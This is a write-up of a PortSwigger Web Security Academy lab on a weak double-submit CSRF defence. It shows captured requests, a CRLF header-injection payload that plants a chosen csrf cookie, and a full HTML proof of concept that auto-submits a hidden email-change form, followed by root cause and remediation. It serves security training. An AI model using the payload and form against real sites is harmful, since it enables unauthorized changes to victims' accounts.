CSRF — Token Duplicated in Cookie

Platform: PortSwigger Web Security Academy
Difficulty: Practitioner
Category: Cross-Site Request Forgery (CSRF)
Tools: Burp Suite, Burp Repeater, HTML, Exploit Server
Status: Solved
Challenge: 30 Days of Web Security — Day 02

1. Objective

The objective of this laboratory was to identify and exploit an insecure implementation of the double-submit cookie CSRF protection mechanism.

The application compares the CSRF token submitted in an HTTP request body with the CSRF token stored in a cookie.

However, it does not securely bind these values to the authenticated user session.

2. Attack Scenario

An attacker wants to change the email address of an authenticated victim.

The attacker cannot directly access the victim's session cookie.

However, the attacker discovers two weaknesses:

The application accepts arbitrary CSRF token values when the cookie and request parameter match.
The application's search functionality is vulnerable to HTTP response header injection, which allows an attacker to influence cookies stored by the victim's browser.

By combining these weaknesses, the attacker can prepare a cross-site request that passes the application's CSRF validation.

3. Initial Request Analysis

I logged into the laboratory as wiener and captured an email change request using Burp Suite.

The request contained a CSRF token in two locations:

POST /my-account/change-email HTTP/2
Host: <LAB-HOST>
Cookie: session=<REDACTED>; csrf=<ORIGINAL_TOKEN>
Content-Type: application/x-www-form-urlencoded

email=test%40example.net&csrf=<ORIGINAL_TOKEN>

The application used a double-submit mechanism: the CSRF value in the cookie was compared with the value submitted in the request body.

4. Testing CSRF Validation

I sent the request to Burp Repeater.

I replaced both CSRF values with the arbitrary value 12345:

POST /my-account/change-email HTTP/2
Host: <LAB-HOST>
Cookie: session=<REDACTED>; csrf=12345
Content-Type: application/x-www-form-urlencoded

email=csrf-lab06%40example.net&csrf=12345

Result: The application accepted the request, and the account email address changed successfully.

This demonstrated that the server accepted attacker-chosen CSRF values as long as they matched.

5. Cookie Injection

The laboratory's search functionality reflects the search parameter in a Set-Cookie response header.

This behavior can be exploited through CRLF injection.

The following payload causes the vulnerable search endpoint to produce an additional cookie-setting header:

GET /?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None HTTP/2
Host: <LAB-HOST>

The injected header has the following structure:

Set-Cookie: csrf=fake; SameSite=None

The purpose of this request is to make the victim's browser store an attacker-chosen CSRF cookie.

6. Exploit Construction

I created an HTML proof of concept using PortSwigger Exploit Server.

<!DOCTYPE html>
<html>
<body>

<form action="https://<LAB-HOST>/my-account/change-email"
      method="POST">

    <input type="hidden"
           name="email"
           value="csrf-lab06-victim@example.net">

    <input type="hidden"
           name="csrf"
           value="fake">

</form>

<img
    src="https://<LAB-HOST>/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None"
    onerror="document.forms[0].submit()">

</body>
</html>
How the Exploit Works

The attack consists of two requests.

First request — Cookie injection

The browser attempts to load an image from the vulnerable search endpoint.

The response injects the attacker-controlled CSRF cookie.

Second request — Email change

The image loading error triggers the HTML form submission.

The browser sends a POST request containing:

Cookie csrf = fake
Body csrf   = fake

The application accepts the request because both values match.

If the victim's authenticated session cookie is also included, the email change is performed in the victim's account.

7. Exploit Verification

I stored the exploit on PortSwigger Exploit Server and used the Deliver to victim functionality.

Result: The laboratory was successfully solved.

The test confirmed that the weak CSRF validation and cookie injection could be combined to perform an unauthorized email change in the laboratory environment.

8. Root Cause

The application implements an insecure double-submit cookie mechanism.

It verifies that two CSRF values match without ensuring that they are securely associated with the authenticated session.

The separate HTTP response header injection vulnerability allows an attacker to control the cookie value.

Together, these weaknesses bypass the intended CSRF protection.

9. Security Impact

The demonstrated impact was unauthorized modification of an authenticated user's account email address.

Depending on the application's email confirmation and password recovery mechanisms, this could contribute to account compromise.

The laboratory did not independently demonstrate a complete account takeover.

10. Remediation

Recommended protections include:

Use CSRF tokens securely bound to authenticated sessions.
Alternatively, implement a properly signed double-submit cookie mechanism using HMAC and session binding.
Reject invalid or improperly associated CSRF tokens.
Prevent CRLF injection in HTTP response headers.
Avoid constructing Set-Cookie headers from untrusted input.
Apply appropriate SameSite cookie settings and origin validation as defense in depth.
Require additional confirmation for sensitive account changes.

Key principle: Matching two attacker-controlled values does not provide meaningful CSRF protection.

11. Key Takeaways

This laboratory demonstrated how an insecure double-submit cookie mechanism can be exploited through a separate cookie injection vulnerability.

I practiced:

Analyzing CSRF tokens in cookies and request bodies.
Testing whether the server accepts arbitrary CSRF values.
Understanding HTTP response header injection.
Combining two vulnerabilities into a complete attack chain.
Building an HTML proof of concept.
Delivering the exploit to the simulated victim.
Documenting the vulnerability, impact, and remediation.

Environment: PortSwigger Web Security Academy
Scope: Authorized educational laboratory only.
